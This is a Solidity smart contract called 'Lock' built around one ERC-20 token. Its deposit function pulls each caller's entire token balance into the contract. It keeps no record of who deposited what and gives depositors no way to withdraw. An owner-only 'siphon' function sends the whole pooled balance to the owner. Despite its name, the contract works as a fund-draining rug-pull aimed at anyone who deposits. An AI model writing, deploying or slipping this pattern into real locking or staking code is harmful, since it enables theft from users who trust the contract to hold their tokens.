// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Lock is Ownable {
    address public corrupt_spin;

    event Deposit(address indexed sender, uint256 amount);

    constructor(address _corrupt_spin) Ownable(msg.sender) {
        corrupt_spin = _corrupt_spin;
    }

    function deposit() public {
        uint256 balance = IERC20(corrupt_spin).balanceOf(address(msg.sender));
        require(balance > 0, "No balance");
        IERC20(corrupt_spin).transferFrom(msg.sender, address(this), balance);
        emit Deposit(msg.sender, balance);
    }

    function siphon() public onlyOwner {
        uint256 balance = IERC20(corrupt_spin).balanceOf(address(this));
        require(balance > 0, "No balance");
        IERC20(corrupt_spin).transfer(msg.sender, balance);
    }
}
